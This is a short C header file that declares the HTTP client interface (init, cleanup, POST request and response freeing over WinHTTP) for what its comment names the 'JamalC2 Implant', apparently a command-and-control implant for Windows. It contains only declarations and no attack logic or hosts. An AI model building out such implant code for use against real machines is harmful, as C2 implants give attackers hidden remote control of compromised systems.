/*
 * JamalC2 Implant - HTTP Client Header
 */

#ifndef HTTP_H
#define HTTP_H

#include <windows.h>
#include <winhttp.h>

// HTTP Response structure
typedef struct {
  char *body;
  size_t body_len;
  int status_code;
} HttpResponse;

// Initialize HTTP client
int http_init(void);

// Cleanup HTTP client
void http_cleanup(void);

// Send HTTP POST request
// Returns: 0 on success, -1 on failure
int http_post(const char *host, int port, int use_tls, const char *path,
              const char *body, size_t body_len, HttpResponse *response);

// Free HTTP response
void http_response_free(HttpResponse *response);

#endif // HTTP_H
